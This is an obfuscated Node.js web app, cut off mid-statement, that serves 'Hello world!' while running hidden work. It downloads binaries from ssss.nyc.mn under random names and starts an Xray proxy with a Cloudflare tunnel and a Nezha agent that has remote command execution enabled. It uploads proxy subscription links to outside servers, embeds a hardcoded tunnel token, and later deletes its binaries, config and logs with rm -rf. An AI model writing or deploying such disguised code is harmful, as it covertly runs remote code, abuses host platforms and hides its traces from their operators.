const _0x3d70ad=_0x3014;function _0x4835(){const _0x25801e=['block','NEZHA\x20variable\x20is\x20empty,skip\x20running','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','--tls','21363140IqJKCR','vless','127.0.0.1','from','writeFileSync','184kqbxfq','/sub.txt\x20saved\x20successfully','false','join','/api/add-nodes','Content-Type','true','UUID','includes','then','taskkill\x20/f\x20/im\x20','Download\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','close','353pOXpld','./tmp','toString','mkdirSync','readFileSync','stringify','pop','existsSync','443','map','\x0a\x20\x20\x20\x20','PROJECT_URL','2083','arm','tunnel.yml','UPLOAD_URL','18tOkkgN','pipe','Error\x20executing\x20command:\x20','child_process','express','eyJhIjoiYjVlMWI4MWY4MzEyZjRmZjA1NWYzZWUxYWQ3NDAzMWEiLCJ0IjoiN2UyZGM2NmUtZGVlZC00Y2UyLWEyMmQtZDdiZWY4YTQwZDhiIiwicyI6IlkyWmxOV0l3Tm1JdE1UY3lOeTAwTmpSbExUZzRaREl0WW1NMFltRXpaVEZoTkRndyJ9','utf-8','App\x20is\x20running','NEZHA_PORT','filter','web\x20running\x20error:\x20','2087','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/vmess-argo','message','https://arm64.ssss.nyc.mn/agent','unlinkSync','push','trojan','4546aMcKUL','platform','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','send','tunnel.json','log','\x20is\x20created','chmod','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','?security=tls&sni=','/tunnel.yml\x20run','?encryption=none&security=tls&sni=','&path=%2Fvless-argo%3Fed%3D2560#','8443','\x20>\x20nul\x202>&1','\x20-c\x20\x22','tcp','createWriteStream','FILE_PATH','base64','aarch64','ARGO_DOMAIN:','/api/delete-nodes','arch','2053','catch','basename','\x20failed:\x20','arm64','none','/vmess-argo?ed=2560','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','clear','Error\x20reading\x20boot.log:','4822868UIpJXe','https://arm64.ssss.nyc.mn/v1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','TunnelSecret','Subscription\x20uploaded\x20successfully','boot.log','stream','Unhandled\x20error\x20in\x20startserver:','automatic\x20access\x20task\x20added\x20successfully','env','split','get','\x0a\x20\x20tunnel:\x20','match','amd','Nodes\x20uploaded\x20successfully','php\x20running\x20error:\x20','https://oooo.serv00.net/add-url','Add\x20automatic\x20access\x20task\x20faild:\x20','post','tunnel','https://arm64.ssss.nyc.mn/bot','path','Skipping\x20adding\x20automatic\x20access\x20task','\x20>/dev/null\x202>&1','response','cdns.doon.eu.org','/vless-argo','\x22\x20>\x20/dev/null\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','437442vgtjJB','quic','win32','readdirSync','all','listen','49167qSIBUz','test','pkill\x20-f\x20\x22[','config.yaml','\x0a\x20\x20\x0atrojan://','freedom','NEZHA_SERVER','\x0aclient_secret:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','1491900ykoWUr','SUB_PATH','isFile','Hello\x20world!','direct','\x20-p\x20','set','tls','Empowerment\x20success\x20for\x20','AUTO_ACCESS','\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/v1','SERVER_PORT','https://arm64.ssss.nyc.mn/web','2096','status','application/json','ARGO_AUTH','https://amd64.ssss.nyc.mn/agent','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0avless://','ArgoDomain:','error','list.txt','NEZHA_KEY','CFIP','/dev/null','\x20-s\x20','text/plain;\x20charset=utf-8','nohup\x20','NAME','\x0a\x20\x20\x0avmess://','/config.json\x20>/dev/null\x202>&1\x20&','http','/api/add-subscriptions','tunnels.wangzhiwei1124.dpdns.org','https://amd64.ssss.nyc.mn/web','substring','exec','config.json','\x20is\x20running','data','http\x20server\x20is\x20running\x20on\x20port:','Error\x20downloading\x20files:','abcdefghijklmnopqrstuvwxyz','CFPORT','&fp=firefox&type=ws&host=','/trojan-argo','npm\x20running\x20error:\x20','\x0a\x20\x20credentials-file:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Empowerment\x20failed\x20for\x20','statSync','1935598dJZvcJ','util','PORT','blackhole','ARGO_PORT','length','unlink','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','xtls-rprx-vision','vmess','forEach'];_0x4835=function(){return _0x25801e;};return _0x4835();}(function(_0x5ddc8a,_0x456e6c){const _0x4e3c9e=_0x3014,_0x1b4aff=_0x5ddc8a();while(!![]){try{const _0x634d23=-parseInt(_0x4e3c9e(0x1a8))/0x1*(-parseInt(_0x4e3c9e(0x101))/0x2)+parseInt(_0x4e3c9e(0x142))/0x3+-parseInt(_0x4e3c9e(0x124))/0x4+-parseInt(_0x4e3c9e(0x151))/0x5+-parseInt(_0x4e3c9e(0xee))/0x6*(parseInt(_0x4e3c9e(0x186))/0x7)+-parseInt(_0x4e3c9e(0x19a))/0x8*(parseInt(_0x4e3c9e(0x148))/0x9)+parseInt(_0x4e3c9e(0x195))/0xa;if(_0x634d23===_0x456e6c)break;else _0x1b4aff['push'](_0x1b4aff['shift']());}catch(_0x45b37e){_0x1b4aff['push'](_0x1b4aff['shift']());}}}(_0x4835,0x98a39));const express=require(_0x3d70ad(0xf2)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x3d70ad(0x13a)),{promisify}=require(_0x3d70ad(0x187)),exec=promisify(require(_0x3d70ad(0xf1))[_0x3d70ad(0x177)]),{execSync}=require(_0x3d70ad(0xf1)),UPLOAD_URL=process[_0x3d70ad(0x12d)][_0x3d70ad(0xed)]||'',PROJECT_URL=process[_0x3d70ad(0x12d)][_0x3d70ad(0xe9)]||'',AUTO_ACCESS=process['env'][_0x3d70ad(0x15a)]||![],FILE_PATH=process['env'][_0x3d70ad(0x114)]||_0x3d70ad(0x1a9),SUB_PATH=process[_0x3d70ad(0x12d)][_0x3d70ad(0x152)]||'sub',PORT=process[_0x3d70ad(0x12d)][_0x3d70ad(0x15d)]||process[_0x3d70ad(0x12d)][_0x3d70ad(0x188)]||0xbb8,UUID=process[_0x3d70ad(0x12d)][_0x3d70ad(0x1a1)]||'9afd1229-b893-40c1-84dd-51e7ce204913',NEZHA_SERVER=process[_0x3d70ad(0x12d)][_0x3d70ad(0x14e)]||'',NEZHA_PORT=process[_0x3d70ad(0x12d)][_0x3d70ad(0xf6)]||'',NEZHA_KEY=process[_0x3d70ad(0x12d)][_0x3d70ad(0x169)]||'',ARGO_DOMAIN=process[_0x3d70ad(0x12d)]['ARGO_DOMAIN']||_0x3d70ad(0x174),ARGO_AUTH=process['env'][_0x3d70ad(0x162)]||_0x3d70ad(0xf3),ARGO_PORT=process[_0x3d70ad(0x12d)][_0x3d70ad(0x18a)]||0x1f41,CFIP=process[_0x3d70ad(0x12d)][_0x3d70ad(0x16a)]||_0x3d70ad(0x13e),CFPORT=process[_0x3d70ad(0x12d)][_0x3d70ad(0x17e)]||0x1bb,NAME=process['env'][_0x3d70ad(0x16f)]||_0x3d70ad(0x138);!fs[_0x3d70ad(0x1af)](FILE_PATH)?(fs[_0x3d70ad(0x1ab)](FILE_PATH),console[_0x3d70ad(0x106)](FILE_PATH+_0x3d70ad(0x107))):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x17c287=_0x3d70ad,_0x5e84cf=_0x17c287(0x17d);let _0xb7558a='';for(let _0xe2ff1d=0x0;_0xe2ff1d<0x6;_0xe2ff1d++){_0xb7558a+=_0x5e84cf['charAt'](Math['floor'](Math['random']()*_0x5e84cf['length']));}return _0xb7558a;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3d70ad(0x19d)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x3d70ad(0x19d)](FILE_PATH,'sub.txt'),listPath=path[_0x3d70ad(0x19d)](FILE_PATH,_0x3d70ad(0x168)),bootLogPath=path[_0x3d70ad(0x19d)](FILE_PATH,_0x3d70ad(0x129)),configPath=path[_0x3d70ad(0x19d)](FILE_PATH,_0x3d70ad(0x178));function deleteNodes(){const _0x2699a9=_0x3d70ad;try{if(!UPLOAD_URL)return;if(!fs[_0x2699a9(0x1af)](subPath))return;let _0x2bb71b;try{_0x2bb71b=fs[_0x2699a9(0x1ac)](subPath,_0x2699a9(0xf4));}catch{return null;}const _0x3b2dfb=Buffer[_0x2699a9(0x198)](_0x2bb71b,_0x2699a9(0x115))[_0x2699a9(0x1aa)](_0x2699a9(0xf4)),_0x3f8df7=_0x3b2dfb[_0x2699a9(0x12e)]('\x0a')[_0x2699a9(0xf7)](_0x5e1289=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2699a9(0x149)](_0x5e1289));if(_0x3f8df7[_0x2699a9(0x18b)]===0x0)return;return axios[_0x2699a9(0x137)](UPLOAD_URL+_0x2699a9(0x118),JSON['stringify']({'nodes':_0x3f8df7}),{'headers':{'Content-Type':'application/json'}})[_0x2699a9(0x11b)](_0x5cf685=>{return null;}),null;}catch(_0x113762){return null;}}function cleanupOldFiles(){const _0x275cb6=_0x3d70ad;try{const _0x9eb3bb=fs[_0x275cb6(0x145)](FILE_PATH);_0x9eb3bb[_0x275cb6(0x190)](_0x1669fb=>{const _0x20744f=_0x275cb6,_0x5b8bc7=path['join'](FILE_PATH,_0x1669fb);try{const _0x22521e=fs[_0x20744f(0x185)](_0x5b8bc7);_0x22521e[_0x20744f(0x153)]()&&fs[_0x20744f(0xfe)](_0x5b8bc7);}catch(_0x10d586){}});}catch(_0x5c56a2){}}app[_0x3d70ad(0x12f)]('/',function(_0x5c7000,_0x1bec9f){const _0x591cb4=_0x3d70ad;_0x1bec9f[_0x591cb4(0x104)](_0x591cb4(0x154));});async function generateConfig(){const _0x4c35ae=_0x3d70ad,_0xb96128={'log':{'access':'/dev/null','error':_0x4c35ae(0x16b),'loglevel':_0x4c35ae(0x11f)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4c35ae(0x196),'settings':{'clients':[{'id':UUID,'flow':_0x4c35ae(0x18e)}],'decryption':_0x4c35ae(0x11f),'fallbacks':[{'dest':0xbb9},{'path':_0x4c35ae(0x13f),'dest':0xbba},{'path':_0x4c35ae(0xfb),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x4c35ae(0x112)}},{'port':0xbb9,'listen':_0x4c35ae(0x197),'protocol':_0x4c35ae(0x196),'settings':{'clients':[{'id':UUID}],'decryption':_0x4c35ae(0x11f)},'streamSettings':{'network':'tcp','security':_0x4c35ae(0x11f)}},{'port':0xbba,'listen':_0x4c35ae(0x197),'protocol':_0x4c35ae(0x196),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4c35ae(0x11f)},'streamSettings':{'network':'ws','security':_0x4c35ae(0x11f),'wsSettings':{'path':_0x4c35ae(0x13f)}},'sniffing':{'enabled':!![],'destOverride':[_0x4c35ae(0x172),_0x4c35ae(0x158),_0x4c35ae(0x143)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x4c35ae(0x18f),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4c35ae(0xfb)}},'sniffing':{'enabled':!![],'destOverride':[_0x4c35ae(0x172),_0x4c35ae(0x158),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4c35ae(0x197),'protocol':_0x4c35ae(0x100),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4c35ae(0x11f),'wsSettings':{'path':_0x4c35ae(0x180)}},'sniffing':{'enabled':!![],'destOverride':[_0x4c35ae(0x172),_0x4c35ae(0x158),_0x4c35ae(0x143)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x4c35ae(0x14d),'tag':_0x4c35ae(0x155)},{'protocol':_0x4c35ae(0x189),'tag':_0x4c35ae(0x191)}]};fs[_0x4c35ae(0x199)](path[_0x4c35ae(0x19d)](FILE_PATH,_0x4c35ae(0x178)),JSON[_0x4c35ae(0x1ad)](_0xb96128,null,0x2));}function getSystemArchitecture(){const _0x2660e7=_0x3d70ad,_0x281f0a=os[_0x2660e7(0x119)]();return _0x281f0a===_0x2660e7(0xeb)||_0x281f0a===_0x2660e7(0x11e)||_0x281f0a===_0x2660e7(0x116)?_0x2660e7(0xeb):_0x2660e7(0x132);}function downloadFile(_0xfe5ba5,_0x42a933,_0x432c61){const _0x234f8a=_0x3d70ad,_0x11cc85=_0xfe5ba5;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x4faa80=fs[_0x234f8a(0x113)](_0x11cc85);axios({'method':_0x234f8a(0x12f),'url':_0x42a933,'responseType':_0x234f8a(0x12a)})[_0x234f8a(0x1a3)](_0x2c1ab2=>{const _0x4870b8=_0x234f8a;_0x2c1ab2[_0x4870b8(0x17a)][_0x4870b8(0xef)](_0x4faa80),_0x4faa80['on']('finish',()=>{const _0x5f4e80=_0x4870b8;_0x4faa80[_0x5f4e80(0x1a7)](),console[_0x5f4e80(0x106)](_0x5f4e80(0x1a5)+path[_0x5f4e80(0x11c)](_0x11cc85)+'\x20successfully'),_0x432c61(null,_0x11cc85);}),_0x4faa80['on'](_0x4870b8(0x167),_0x29f1d3=>{const _0x43c2ce=_0x4870b8;fs[_0x43c2ce(0x18c)](_0x11cc85,()=>{});const _0x10c74f=_0x43c2ce(0x1a5)+path[_0x43c2ce(0x11c)](_0x11cc85)+_0x43c2ce(0x11d)+_0x29f1d3[_0x43c2ce(0xfc)];console['error'](_0x10c74f),_0x432c61(_0x10c74f);});})[_0x234f8a(0x11b)](_0x299697=>{const _0x3286aa=_0x234f8a,_0x80abf3=_0x3286aa(0x1a5)+path[_0x3286aa(0x11c)](_0x11cc85)+'\x20failed:\x20'+_0x299697[_0x3286aa(0xfc)];console[_0x3286aa(0x167)](_0x80abf3),_0x432c61(_0x80abf3);});}async function downloadFilesAndRun(){const _0x46f4c6=_0x3d70ad,_0x2762bf=getSystemArchitecture(),_0x577caa=getFilesForArchitecture(_0x2762bf);if(_0x577caa['length']===0x0){console[_0x46f4c6(0x106)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x549a95=_0x577caa[_0x46f4c6(0x1b1)](_0x45bb61=>{return new Promise((_0x1bf153,_0x378e4e)=>{downloadFile(_0x45bb61['fileName'],_0x45bb61['fileUrl'],(_0x8a9304,_0x1d59dd)=>{_0x8a9304?_0x378e4e(_0x8a9304):_0x1bf153(_0x1d59dd);});});});try{await Promise[_0x46f4c6(0x146)](_0x549a95);}catch(_0x2df524){console[_0x46f4c6(0x167)](_0x46f4c6(0x17c),_0x2df524);return;}function _0x46c7b6(_0x989a7b){const _0x5c397a=_0x46f4c6,_0x3db45d=0x1fd;_0x989a7b[_0x5c397a(0x190)](_0x520aa0=>{const _0x2c9aef=_0x5c397a;fs[_0x2c9aef(0x1af)](_0x520aa0)&&fs[_0x2c9aef(0x108)](_0x520aa0,_0x3db45d,_0x2d7ba8=>{const _0x257357=_0x2c9aef;_0x2d7ba8?console['error'](_0x257357(0x184)+_0x520aa0+':\x20'+_0x2d7ba8):console[_0x257357(0x106)](_0x257357(0x159)+_0x520aa0+':\x20'+_0x3db45d[_0x257357(0x1aa)](0x8));});});}const _0x42cc1e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x46c7b6(_0x42cc1e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x294fbc=NEZHA_SERVER[_0x46f4c6(0x1a2)](':')?NEZHA_SERVER['split'](':')[_0x46f4c6(0x1ae)]():'',_0x167a8e=new Set([_0x46f4c6(0x1b0),_0x46f4c6(0x10f),'2096',_0x46f4c6(0xf9),_0x46f4c6(0xea),_0x46f4c6(0x11a)]),_0x26b179=_0x167a8e['has'](_0x294fbc)?_0x46f4c6(0x1a0):_0x46f4c6(0x19c),_0xb03eab=_0x46f4c6(0x14f)+NEZHA_KEY+_0x46f4c6(0x164)+NEZHA_SERVER+_0x46f4c6(0x1a6)+_0x26b179+_0x46f4c6(0x18d)+UUID;fs['writeFileSync'](path[_0x46f4c6(0x19d)](FILE_PATH,_0x46f4c6(0x14b)),_0xb03eab);const _0x2fa4e0=_0x46f4c6(0x16e)+phpPath+_0x46f4c6(0x111)+FILE_PATH+_0x46f4c6(0x193);try{await exec(_0x2fa4e0),console[_0x46f4c6(0x106)](phpName+_0x46f4c6(0x179)),await new Promise(_0x2be6ad=>setTimeout(_0x2be6ad,0x3e8));}catch(_0x34b04c){console[_0x46f4c6(0x167)](_0x46f4c6(0x134)+_0x34b04c);}}else{let _0x43b0ea='';const _0x2dc598=['443',_0x46f4c6(0x10f),_0x46f4c6(0x15f),_0x46f4c6(0xf9),_0x46f4c6(0xea),_0x46f4c6(0x11a)];_0x2dc598[_0x46f4c6(0x1a2)](NEZHA_PORT)&&(_0x43b0ea=_0x46f4c6(0x194));const _0x295a4f=_0x46f4c6(0x16e)+npmPath+_0x46f4c6(0x16c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x46f4c6(0x156)+NEZHA_KEY+'\x20'+_0x43b0ea+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x295a4f),console[_0x46f4c6(0x106)](npmName+_0x46f4c6(0x179)),await new Promise(_0x23b493=>setTimeout(_0x23b493,0x3e8));}catch(_0x18eb4c){console[_0x46f4c6(0x167)](_0x46f4c6(0x181)+_0x18eb4c);}}}else console[_0x46f4c6(0x106)](_0x46f4c6(0x192));const _0x340167=_0x46f4c6(0x16e)+webPath+'\x20-c\x20'+FILE_PATH+_0x46f4c6(0x171);try{await exec(_0x340167),console['log'](webName+_0x46f4c6(0x179)),await new Promise(_0x1de495=>setTimeout(_0x1de495,0x3e8));}catch(_0xf0f46){console[_0x46f4c6(0x167)](_0x46f4c6(0xf8)+_0xf0f46);}if(fs['existsSync'](botPath)){let _0x6b7bb0;if(ARGO_AUTH[_0x46f4c6(0x131)](/^[A-Z0-9a-z=]{120,250}$/))_0x6b7bb0='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x46f4c6(0x131)](/TunnelSecret/)?_0x6b7bb0='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x46f4c6(0x10c):_0x6b7bb0=_0x46f4c6(0x141)+FILE_PATH+_0x46f4c6(0x126)+ARGO_PORT;try{await exec(_0x46f4c6(0x16e)+botPath+'\x20'+_0x6b7bb0+_0x46f4c6(0x15b)),console[_0x46f4c6(0x106)](botName+_0x46f4c6(0x179)),await new Promise(_0x7ab84e=>setTimeout(_0x7ab84e,0x7d0));}catch(_0x545074){console[_0x46f4c6(0x167)](_0x46f4c6(0xf0)+_0x545074);}}await new Promise(_0x14dced=>setTimeout(_0x14dced,0x1388));}function getFilesForArchitecture(_0x2003ad){const _0x5bf14d=_0x3d70ad;let _0x48bc14;_0x2003ad==='arm'?_0x48bc14=[{'fileName':webPath,'fileUrl':_0x5bf14d(0x15e)},{'fileName':botPath,'fileUrl':_0x5bf14d(0x139)}]:_0x48bc14=[{'fileName':webPath,'fileUrl':_0x5bf14d(0x175)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3b6447=_0x2003ad===_0x5bf14d(0xeb)?_0x5bf14d(0xfd):_0x5bf14d(0x163);_0x48bc14['unshift']({'fileName':npmPath,'fileUrl':_0x3b6447});}else{const _0x24108e=_0x2003ad===_0x5bf14d(0xeb)?_0x5bf14d(0x125):_0x5bf14d(0x15c);_0x48bc14['unshift']({'fileName':phpPath,'fileUrl':_0x24108e});}}return _0x48bc14;}function argoType(){const _0x1ce95f=_0x3d70ad;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1ce95f(0x106)](_0x1ce95f(0x103));return;}if(ARGO_AUTH[_0x1ce95f(0x1a2)](_0x1ce95f(0x127))){fs[_0x1ce95f(0x199)](path['join'](FILE_PATH,_0x1ce95f(0x105)),ARGO_AUTH);const _0x18908e=_0x1ce95f(0x130)+ARGO_AUTH[_0x1ce95f(0x12e)]('\x22')[0xb]+_0x1ce95f(0x182)+path[_0x1ce95f(0x19d)](FILE_PATH,'tunnel.json')+_0x1ce95f(0x109)+ARGO_DOMAIN+_0x1ce95f(0x183)+ARGO_PORT+_0x1ce95f(0xfa);fs['writeFileSync'](path[_0x1ce95f(0x19d)](FILE_PATH,_0x1ce95f(0xec)),_0x18908e);}else console[_0x1ce95f(0x106)](_0x1ce95f(0x10a));}argoType();async function extractDomains(){const _0x55ceea=_0x3d70ad;let _0x260f71;if(ARGO_AUTH&&ARGO_DOMAIN)_0x260f71=ARGO_DOMAIN,console['log'](_0x55ceea(0x117),_0x260f71),await _0x4d55c0(_0x260f71);else try{const _0x39cea0=fs[_0x55ceea(0x1ac)](path[_0x55ceea(0x19d)](FILE_PATH,_0x55ceea(0x129)),_0x55ceea(0xf4)),_0x407936=_0x39cea0[_0x55ceea(0x12e)]('\x0a'),_0x40c13b=[];_0x407936[_0x55ceea(0x190)](_0x1d518b=>{const _0x6e12a9=_0x55ceea,_0x108b9f=_0x1d518b[_0x6e12a9(0x131)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x108b9f){const _0x33ccb2=_0x108b9f[0x1];_0x40c13b[_0x6e12a9(0xff)](_0x33ccb2);}});if(_0x40c13b[_0x55ceea(0x18b)]>0x0)_0x260f71=_0x40c13b[0x0],console[_0x55ceea(0x106)](_0x55ceea(0x166),_0x260f71),await _0x4d55c0(_0x260f71);else{console[_0x55ceea(0x106)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x55ceea(0xfe)](path[_0x55ceea(0x19d)](FILE_PATH,_0x55ceea(0x129)));async function _0x1c62f3(){const _0x2c85fe=_0x55ceea;try{process[_0x2c85fe(0x102)]===_0x2c85fe(0x144)?await exec(_0x2c85fe(0x1a4)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x2c85fe(0x14a)+botName['charAt'](0x0)+']'+botName[_0x2c85fe(0x176)](0x1)+_0x2c85fe(0x140));}catch(_0x240deb){}}_0x1c62f3(),await new Promise(_0x5d0082=>setTimeout(_0x5d0082,0xbb8));const _0x25aafd=_0x55ceea(0x141)+FILE_PATH+_0x55ceea(0x126)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x25aafd+_0x55ceea(0x15b)),console['log'](botName+_0x55ceea(0x179)),await new Promise(_0x374b7c=>setTimeout(_0x374b7c,0xbb8)),await extractDomains();}catch(_0x4b5529){console['error'](_0x55ceea(0xf0)+_0x4b5529);}}}catch(_0x393a89){console[_0x55ceea(0x167)](_0x55ceea(0x123),_0x393a89);}async function _0x4d55c0(_0xed3e7b){const _0x54f7aa=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':'utf-8'}),_0x149dfa=_0x54f7aa['trim'](),_0x371e51=NAME?NAME+'-'+_0x149dfa:_0x149dfa;return new Promise(_0x4eb721=>{setTimeout(()=>{const _0x4e0741=_0x3014,_0x3804cb={'v':'2','ps':''+_0x371e51,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x4e0741(0x11f),'host':_0xed3e7b,'path':_0x4e0741(0x120),'tls':_0x4e0741(0x158),'sni':_0xed3e7b,'alpn':'','fp':'firefox'},_0x445743=_0x4e0741(0x165)+UUID+'@'+CFIP+':'+CFPORT+_0x4e0741(0x10d)+_0xed3e7b+_0x4e0741(0x17f)+_0xed3e7b+_0x4e0741(0x10e)+_0x371e51+_0x4e0741(0x170)+Buffer[_0x4e0741(0x198)](JSON[_0x4e0741(0x1ad)](_0x3804cb))[_0x4e0741(0x1aa)](_0x4e0741(0x115))+_0x4e0741(0x14c)+UUID+'@'+CFIP+':'+CFPORT+_0x4e0741(0x10b)+_0xed3e7b+_0x4e0741(0x17f)+_0xed3e7b+_0x4e0741(0x150)+_0x371e51+_0x4e0741(0xe8);console['log'](Buffer['from'](_0x445743)['toString'](_0x4e0741(0x115))),fs['writeFileSync'](subPath,Buffer[_0x4e0741(0x198)](_0x445743)['toString'](_0x4e0741(0x115))),console['log'](FILE_PATH+_0x4e0741(0x19b)),uploadNodes(),app[_0x4e0741(0x12f)]('/'+SUB_PATH,(_0x590309,_0x38a903)=>{const _0x4e22ac=_0x4e0741,_0x38bb35=Buffer[_0x4e22ac(0x198)](_0x445743)[_0x4e22ac(0x1aa)](_0x4e22ac(0x115));_0x38a903[_0x4e22ac(0x157)](_0x4e22ac(0x19f),_0x4e22ac(0x16d)),_0x38a903[_0x4e22ac(0x104)](_0x38bb35);}),_0x4eb721(_0x445743);},0x7d0);});}}async function uploadNodes(){const _0x41bce7=_0x3d70ad;if(UPLOAD_URL&&PROJECT_URL){const _0x3da334=PROJECT_URL+'/'+SUB_PATH,_0x11392b={'subscription':[_0x3da334]};try{const _0x286a6b=await axios['post'](UPLOAD_URL+_0x41bce7(0x173),_0x11392b,{'headers':{'Content-Type':_0x41bce7(0x161)}});return _0x286a6b&&_0x286a6b[_0x41bce7(0x160)]===0xc8?(console[_0x41bce7(0x106)](_0x41bce7(0x128)),_0x286a6b):null;}catch(_0x1632db){if(_0x1632db[_0x41bce7(0x13d)]){if(_0x1632db[_0x41bce7(0x13d)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x4e07ef=fs[_0x41bce7(0x1ac)](listPath,_0x41bce7(0xf4)),_0x4d2c1f=_0x4e07ef['split']('\x0a')[_0x41bce7(0xf7)](_0x6e5061=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x41bce7(0x149)](_0x6e5061));if(_0x4d2c1f[_0x41bce7(0x18b)]===0x0)return;const _0x20e4e2=JSON[_0x41bce7(0x1ad)]({'nodes':_0x4d2c1f});try{const _0x3e9e29=await axios[_0x41bce7(0x137)](UPLOAD_URL+_0x41bce7(0x19e),_0x20e4e2,{'headers':{'Content-Type':_0x41bce7(0x161)}});return _0x3e9e29&&_0x3e9e29[_0x41bce7(0x160)]===0xc8?(console[_0x41bce7(0x106)](_0x41bce7(0x133)),_0x3e9e29):null;}catch(_0x2b85ba){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5b4021=_0x3014,_0x24b755=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x24b755[_0x5b4021(0xff)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x24b755[_0x5b4021(0xff)](phpPath);process[_0x5b4021(0x102)]===_0x5b4021(0x144)?exec('del\x20/f\x20/q\x20'+_0x24b755['join']('\x20')+_0x5b4021(0x110),_0x2462ee=>{const _0x1d2af7=_0x5b4021;console[_0x1d2af7(0x122)](),console[_0x1d2af7(0x106)]('App\x20is\x20running'),console[_0x1d2af7(0x106)](_0x1d2af7(0x121));}):exec('rm\x20-rf\x20'+_0x24b755[_0x5b4021(0x19d)]('\x20')+_0x5b4021(0x13c),_0x4deea3=>{const _0x56539d=_0x5b4021;console['clear'](),console[_0x56539d(0x106)](_0x56539d(0xf5)),console[_0x56539d(0x106)](_0x56539d(0x121));});},0x15f90);}function _0x3014(_0x369e85,_0x422117){const _0x4835ed=_0x4835();return _0x3014=function(_0x301485,_0x48bae2){_0x301485=_0x301485-0xe8;let _0x4e86c8=_0x4835ed[_0x301485];return _0x4e86c8;},_0x3014(_0x369e85,_0x422117);}cleanFiles();async function AddVisitTask(){const _0x5dab08=_0x3d70ad;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5dab08(0x106)](_0x5dab08(0x13b));return;}try{const _0x54229f=await axios['post'](_0x5dab08(0x135),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5dab08(0x161)}});return console[_0x5dab08(0x106)](_0x5dab08(0x12c)),_0x54229f;}catch(_0x3ca280){return console[_0x5dab08(0x167)](_0x5dab08(0x136)+_0x3ca280[_0x5dab08(0xfc)]),null;}}async function startserver(){const _0x5cca6d=_0x3d70ad;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 